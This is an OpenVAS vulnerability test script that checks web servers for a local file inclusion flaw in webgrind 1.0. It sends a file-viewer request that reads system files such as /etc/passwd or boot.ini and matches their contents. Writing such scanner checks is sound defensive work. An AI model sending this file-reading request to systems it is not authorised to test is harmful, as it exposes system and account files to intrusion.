###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_webgrind_lfi_02_2012.nasl 5642 2017-03-21 08:49:30Z cfi $
#
# webgrind 1.0 (file param) Local File Inclusion Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_summary = "Webgrind is prone to a local file-include vulnerability because it
fails to properly sanitize user-supplied input.

An attacker can exploit this vulnerability to view files and execute
local scripts in the context of the webserver process. This may aid in
further attacks.

Webgrind 1.0 (v1.02 in trunk on github) are vulnerable; other versions may also be affected.";


if (description)
{
 script_id(103439);
 script_version ("$Revision: 5642 $");

 script_name("webgrind 1.0 (file param) Local File Inclusion Vulnerability");

 script_xref(name : "URL" , value : "http://www.zeroscience.mk/en/vulnerabilities/ZSL-2012-5075.php");

 script_cve_id("CVE-2011-3047");
 script_tag(name:"cvss_base", value:"10.0");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
 script_tag(name:"last_modification", value:"$Date: 2017-03-21 09:49:30 +0100 (Tue, 21 Mar 2017) $");
 script_tag(name:"creation_date", value:"2012-02-28 11:24:22 +0100 (Tue, 28 Feb 2012)");
 script_summary("Determine if Webgrind is prone to a local file-include vulnerability");
 script_category(ACT_ATTACK);
 script_tag(name:"qod_type", value:"remote_vul");
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2012 Greenbone Networks GmbH");
 script_dependencies("find_service.nasl", "http_version.nasl", "os_detection.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 script_tag(name : "summary" , value : tag_summary);
 exit(0);
}

include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");
include("global_settings.inc");
   
port = get_http_port(default:80);
if(!get_port_state(port))exit(0);
if(!can_host_php(port:port))exit(0);

dirs = make_list("/webgrind",cgi_dirs());
files = traversal_files();

foreach dir (dirs) {
  foreach file (keys(files)) {
   
    url = string(dir, "/index.php"); 

    if(http_vuln_check(port:port, url:url,pattern:"<title>webgrind</title>")) {

      url = string(dir,"/index.php?file=/",files[file],"&op=fileviewer");

      if(http_vuln_check(port:port, url:url,pattern:"(root:.:0:[01]:|\[boot loader\])")) {
     
        security_message(port:port);
        exit(0);

      }  

   }
  }
}

exit(0);
